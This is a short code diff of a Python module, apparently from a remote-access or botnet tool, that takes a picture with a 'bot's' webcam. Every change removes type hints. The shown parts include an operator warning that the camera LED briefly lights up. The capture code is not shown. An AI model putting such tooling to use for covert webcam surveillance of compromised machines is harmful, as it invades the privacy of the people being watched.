@@ -9,7 +9,7 @@ from server.modules.helper import *
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author:": ["Marten4n6"],
             "Description": "Take a picture using the bot's webcam.",
@@ -19,12 +19,12 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def get_setup_messages(self) -> List[str]:
+    def get_setup_messages(self):
         return [
             "Local output name (Leave empty for <RANDOM>): "
         ]
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         should_continue = self._view.should_continue([
             "A green LED will show next to the bot's camera (for about a second).",
             "This module also touches the disk."
@@ -44,7 +44,7 @@ class Module(ModuleABC):
         else:
             return False, None
 
-    def process_response(self, response: bytes, response_options: dict):
+    def process_response(self, response, response_options):
         output_name = "{}.png".format(response_options["output_name"])
         output_file = path.join(OUTPUT_DIRECTORY, output_name)
 
